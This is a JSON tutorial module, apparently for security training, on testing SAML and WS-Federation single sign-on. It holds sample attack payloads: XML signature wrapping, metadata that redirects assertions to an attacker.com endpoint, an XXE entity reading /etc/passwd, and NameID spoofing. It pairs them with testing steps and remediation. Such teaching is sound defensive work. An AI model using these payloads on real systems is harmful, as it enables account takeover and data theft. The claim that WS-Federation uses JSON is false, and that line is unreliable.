{
  "id": "sso_federation",
  "title": "SSO & Federation Misconfigurations",
  "description": "SSO & Federation Misconfigurations tutorial phase covering SAML, WS-Federation, and federation protocol security testing",
  "type": "tutorial",
  "steps": [
    {
      "id": "sso-federation-misconfigurations",
      "title": "SSO & Federation Misconfigurations",
      "content": "OBJECTIVE: Test SAML, WS-Federation, and other federation protocols for common misconfigurations including metadata poisoning, signature validation bypass, and trust relationship abuse.\n\nACADEMIC BACKGROUND:\nSingle Sign-On (SSO) enables users to access multiple applications with one authentication. SAML 2.0 is the most common protocol, followed by WS-Federation and OAuth/OIDC. According to OWASP and SAML Security Cheat Sheet, common vulnerabilities include:\n- XML Signature Wrapping attacks\n- Metadata poisoning\n- Weak certificate validation\n- NameID spoofing\n- XXE (XML External Entity) injection\n\nMITRE ATT&CK mappings:\n- T1078: Valid Accounts (federated identities)\n- T1550: Use Alternate Authentication Material (SAML tokens)\n- T1600: Weaken Encryption (downgrade attacks)\n\nSTEP-BY-STEP PROCESS:\n\n1. FEDERATION PROTOCOL FUNDAMENTALS:\n\n   SAML 2.0 Core Concepts:\n   - Identity Provider (IdP): Authenticates users\n   - Service Provider (SP): Application being accessed\n   - Assertion: XML document containing user identity/attributes\n   - Metadata: XML document describing IdP/SP capabilities\n   - Bindings: How SAML messages are transported (HTTP-POST, HTTP-Redirect, SOAP)\n   \n   Key SAML Components:\n   - AuthnRequest: SP requests authentication from IdP\n   - Response: IdP sends assertion to SP\n   - LogoutRequest/Response: Single logout functionality\n   - Metadata Exchange: Automatic configuration sharing\n\n   WS-Federation Concepts:\n   - Similar to SAML but uses JSON instead of XML\n   - Uses RST/RSTR (Request Security Token) messages\n   - Integrated with Microsoft technologies\n\n2. CRITICAL SECURITY CONTROLS:\n\n   XML Signature Validation:\n   - Signatures prevent message tampering\n   - Must validate entire XML document\n   - Vulnerable to signature wrapping attacks\n   \n   Certificate Validation:\n   - Verify certificate chain and revocation\n   - Check certificate dates and purposes\n   - Pin expected certificates\n   \n   Metadata Security:\n   - Metadata contains endpoint URLs and certificates\n   - Should be signed and validated\n   - Vulnerable to poisoning attacks\n\n3. COMMON VULNERABILITIES AND TESTING:\n\n   a) XML Signature Wrapping:\n      \n      Attack: Inject malicious content into signed SAML response\n      ```xml\n      <!-- Original signed assertion -->\n      <saml:Assertion ID=\"original\">\n        <saml:Subject>\n          <saml:NameID>user@example.com</saml:NameID>\n        </saml:Subject>\n      </saml:Assertion>\n      \n      <!-- Attacker injects new assertion with same ID -->\n      <saml:Assertion ID=\"original\">\n        <saml:Subject>\n          <saml:NameID>admin@example.com</saml:NameID>\n        </saml:Subject>\n      </saml:Assertion>\n      ```\n      \n      Testing:\n      - Modify SAML responses in proxy\n      - Test if signature validation catches wrapping\n      - Check for duplicate ID handling\n\n   b) Metadata Poisoning:\n      \n      Attack: Replace legitimate metadata with malicious endpoints\n      ```xml\n      <!-- Poisoned metadata -->\n      <EntityDescriptor entityID=\"https://sp.example.com\">\n        <SPSSODescriptor>\n          <AssertionConsumerService\n            Binding=\"urn:oasis:names:tc:SAML:2.0:bindings:HTTP-POST\"\n            Location=\"https://attacker.com/saml\"/>\n        </SPSSODescriptor>\n      </EntityDescriptor>\n      ```\n      \n      Testing:\n      - Check if metadata is signed\n      - Test metadata refresh mechanisms\n      - Verify endpoint validation\n\n   c) XXE (XML External Entity) Injection:\n      \n      Attack: Exploit XML parser to read local files or make requests\n      ```xml\n      <?xml version=\"1.0\" encoding=\"UTF-8\"?>\n      <!DOCTYPE foo [ <!ENTITY xxe SYSTEM \"file:///etc/passwd\"> ]>\n      <samlp:AuthnRequest xmlns:samlp=\"urn:oasis:names:tc:SAML:2.0:protocol\">\n        <saml:Issuer xmlns:saml=\"urn:oasis:names:tc:SAML:2.0:assertion\">&xxe;</saml:Issuer>\n      </samlp:AuthnRequest>\n      ```\n      \n      Testing:\n      - Inject XXE payloads in SAML messages\n      - Check for external entity resolution\n      - Verify XML parser security settings\n\n   d) NameID Spoofing:\n      \n      Attack: Manipulate user identity in SAML assertion\n      ```xml\n      <saml:NameID Format=\"urn:oasis:names:tc:SAML:1.1:nameid-format:emailAddress\">\n        admin@example.com\n      </saml:NameID>\n      ```\n      \n      Testing:\n      - Modify NameID values in responses\n      - Test NameID policy enforcement\n      - Check for NameID encryption\n\n4. SAML ASSERTION ANALYSIS:\n\n   Assertion Structure:\n   ```xml\n   <saml:Assertion>\n     <saml:Issuer>IdP Entity ID</saml:Issuer>\n     <saml:Subject>\n       <saml:NameID>user@domain.com</saml:NameID>\n       <saml:SubjectConfirmation>\n         <saml:SubjectConfirmationData NotOnOrAfter=\"...\" Recipient=\"...\"/>\n       </saml:SubjectConfirmation>\n     </saml:Subject>\n     <saml:Conditions NotBefore=\"...\" NotOnOrAfter=\"...\">\n       <saml:AudienceRestriction>\n         <saml:Audience>SP Entity ID</saml:Audience>\n       </saml:AudienceRestriction>\n     </saml:Conditions>\n     <saml:AuthnStatement>\n       <saml:AuthnContext>\n         <saml:AuthnContextClassRef>Password</saml:AuthnContextClassRef>\n       </saml:AuthnContext>\n     </saml:AuthnStatement>\n     <saml:AttributeStatement>\n       <saml:Attribute Name=\"groups\">\n         <saml:AttributeValue>admin</saml:AttributeValue>\n       </saml:Attribute>\n     </saml:AttributeStatement>\n   </saml:Assertion>\n   ```\n\n   Key Security Checks:\n   - Issuer validation\n   - Audience restriction\n   - Time conditions (NotBefore/NotOnOrAfter)\n   - Subject confirmation data\n   - Signature validation\n\n5. FEDERATION TRUST RELATIONSHIPS:\n\n   Trust Establishment:\n   - Certificate exchange\n   - Metadata sharing\n   - Manual configuration\n   \n   Trust Attacks:\n   - Certificate spoofing\n   - Man-in-the-middle\n   - DNS poisoning\n   - Metadata manipulation\n\n6. TESTING METHODOLOGY:\n\n   Passive Testing:\n   ```bash\n   # Capture SAML traffic\n   tcpdump -i eth0 -w saml_traffic.pcap port 443\n   \n   # Extract SAML messages\n   # Use Burp Suite SAML extension or manual extraction\n   ```\n\n   Active Testing:\n   ```bash\n   # Modify SAML responses in Burp\n   # Test signature wrapping attacks\n   # Attempt privilege escalation via attribute manipulation\n   ```\n\n   Automated Testing:\n   ```bash\n   # Use SAML testing tools\n   # python-saml for testing\n   # SAML Raider Burp extension\n   ```\n\n7. LAB SCENARIO - SAML Testing Environment:\n\n   Setup:\n   ```bash\n   # Deploy test IdP and SP\n   # Use Shibboleth or SimpleSAMLphp\n   \n   # Configure intentional vulnerabilities:\n   # - Weak signature validation\n   # - Unsigned metadata\n   # - Permissive redirect URIs\n   ```\n\n   Testing Workflow:\n   ```bash\n   # 1. Baseline authentication flow\n   # 2. Capture and analyze SAML messages\n   # 3. Test signature wrapping attacks\n   # 4. Attempt metadata poisoning\n   # 5. Test XXE injection\n   # 6. Validate remediation\n   ```\n\n8. REMEDIATION GUIDANCE:\n\n   SAML Implementation:\n   - Use secure XML parsers (disable entity resolution)\n   - Implement strict signature validation\n   - Sign all SAML messages\n   - Encrypt sensitive data (NameID, attributes)\n   - Use short assertion lifetimes\n   - Implement proper logout handling\n\n   Infrastructure:\n   - Use HTTPS for all SAML endpoints\n   - Implement HSTS headers\n   - Regular certificate rotation\n   - Monitor for anomalous SAML traffic\n\nTOOLS AND RESOURCES:\n- SAML Raider: Burp Suite extension for SAML testing\n- saml2aws: CLI tool for SAML authentication\n- python-saml: SAML toolkit for Python\n- Shibboleth: Open-source SAML implementation\n- SimpleSAMLphp: PHP SAML toolkit\n\nREFERENCES:\n- SAML Security Cheat Sheet: https://cheatsheetseries.owasp.org/cheatsheets/SAML_Security_Cheat_Sheet.html\n- SAML 2.0 Specification: https://docs.oasis-open.org/security/saml/v2.0/\n- WS-Federation Specification: https://docs.microsoft.com/en/openspecs/windows_protocols/ms-wsfed/\n- SAML Metadata Interoperability Profile: https://docs.oasis-open.org/security/saml/Post2.0/sstc-saml-metadata-errata-2.0-wd-04.html\n\nFor detailed testing methodology and automation scripts, refer to the 'federation-attack-scenarios' in the Tool Instructions panel.",
      "tags": [
        "cloud",
        "sso",
        "federation"
      ],
      "related_tools": [
        "ml-pipeline-audit",
        "hunter-io",
        "federation-attack-scenarios",
        "workflow_cloud_security_assessment",
        "sso-oauth-oidc-misconfig-playbook"
      ]
    }
  ]
}